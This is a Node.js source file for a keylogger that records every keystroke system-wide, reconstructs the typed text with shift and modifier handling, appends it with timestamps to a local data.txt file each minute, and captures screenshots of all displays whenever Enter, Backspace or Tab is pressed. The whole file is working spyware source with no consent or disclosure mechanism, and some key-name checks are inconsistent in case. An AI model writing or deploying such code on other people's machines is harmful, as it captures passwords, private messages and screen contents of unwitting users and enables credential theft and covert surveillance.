const fs = require('fs');
const keylogger = require('keylogger.js');
const screenshot = require('screenshot-desktop');

let textBuffer = '';
const activeModifiers = new Set();

const SHIFT_KEY_MAP = {
  1: '!',
  2: '@',
  3: '#',
  4: '$',
  5: '%',
  6: '^',
  7: '&',
  8: '*',
  9: '(',
  0: ')',
  '-': '_',
  '=': '+',
  '[': '{',
  ']': '}',
  '\\': '|',
  ';': ':',
  "'": '"',
  ',': '<',
  '.': '>',
  '/': '?',
  '`': '~',
};

const SPECIAL_KEYS = [
  'Enter',
  'Backspace',
  'Tab',
  'Escape',
  'Delete',
  'ArrowLeft',
  'ArrowRight',
  'ArrowUp',
  'ArrowDown',
  'Home',
  'End',
  'PageUp',
  'PageDown',
];

const formatDate = (date) =>
  `${String(date.getDate()).padStart(2, '0')}/${String(
    date.getMonth() + 1,
  ).padStart(2, '0')}/${date.getFullYear()}`;

const formatTime = (date) =>
  `${String(date.getHours()).padStart(2, '0')}:${String(
    date.getMinutes(),
  ).padStart(2, '0')}`;

function writeToFileAndClearBuffer() {
  if (textBuffer) {
    const now = new Date();
    const timestamp = `${formatDate(now)} ${formatTime(now)} - `;
    fs.appendFileSync('data.txt', `${timestamp}${textBuffer}\n`);
    textBuffer = '';
  }
}

function handleKey(key, isKeyUp) {
  if (['Shift', 'Alt', 'Meta', 'Control'].includes(key)) {
    isKeyUp ? activeModifiers.delete(key) : activeModifiers.add(key);
  } else if (!isKeyUp) {
    let outputKey = key.toUpperCase() === 'SPACEBAR' ? ' ' : key;

    if (key === 'BACKSPACE') {
      textBuffer = textBuffer.slice(0, -1);
    } else if (key === 'ENTER') {
      textBuffer += '<ENTER>';
    } else if (key === 'DELETE') {
      outputKey = '<DELETE>';
    } else {
      if (activeModifiers.has('SHIFT') && SHIFT_KEY_MAP[key])
        outputKey = SHIFT_KEY_MAP[key];
      else if (activeModifiers.size > 0 || SPECIAL_KEYS.includes(key)) {
        outputKey = `<${[...activeModifiers]
          .map((mod) => mod.toUpperCase())
          .join('+')}+${outputKey}>`;
        activeModifiers.clear();
      }

      textBuffer +=
        (textBuffer.slice(-1) !== ' ' && outputKey.length > 1 ? ' ' : '') +
        outputKey;
    }
  }
}

function takeScreenshot() {
  screenshot
    .all()
    .then((imgs) => {
      imgs.forEach((img, index) => {
        fs.writeFileSync(`img/${Date.now()}-${index}.png`, img);
      });
    })
    .catch((err) => {
      console.error(err);
    });
}

function handleKeyPress(key, isKeyUp) {
  if (!isKeyUp && (key === 'Enter' || key === 'Backspace' || key === 'Tab')) {
    takeScreenshot();
  }
}

keylogger.start((key, isKeyUp) => {
  handleKey(key, isKeyUp);
  handleKeyPress(key, isKeyUp);
});
setInterval(writeToFileAndClearBuffer, 60000);
process.on('beforeExit', writeToFileAndClearBuffer);
